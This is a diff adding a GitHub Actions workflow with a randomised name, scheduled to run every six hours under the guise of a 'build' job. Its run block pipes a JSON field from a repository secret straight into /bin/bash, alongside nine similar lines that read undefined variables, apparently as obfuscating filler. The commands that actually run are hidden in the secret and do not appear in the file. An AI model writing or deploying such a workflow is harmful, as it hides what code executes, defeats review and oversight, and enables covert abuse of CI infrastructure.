@@ -1,0 +1,26 @@
+name: jiuqiankedemianzi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiuqiankedemianzi
+        env:
+          pbpr3483: ${{ secrets.pbpr3483 }}
+        run: |
+          echo $pbpr3483 | jq -r .q09 | /bin/bash
+          echo $hee4 | jq -r .ymvjl516 | /bin/bash
+          echo $pfatf1742 | jq -r .l9856 | /bin/bash
+          echo $b94965 | jq -r .rti6682 | /bin/bash
+          echo $dtss90429 | jq -r .ygzy85652 | /bin/bash
+          echo $ibxxe42 | jq -r .ndc352 | /bin/bash
+          echo $n21 | jq -r .o42 | /bin/bash
+          echo $wsju76381 | jq -r .erb152 | /bin/bash
+          echo $wdzp1 | jq -r .lhzn36068 | /bin/bash
+          echo $r5594 | jq -r .srd0 | /bin/bash
+
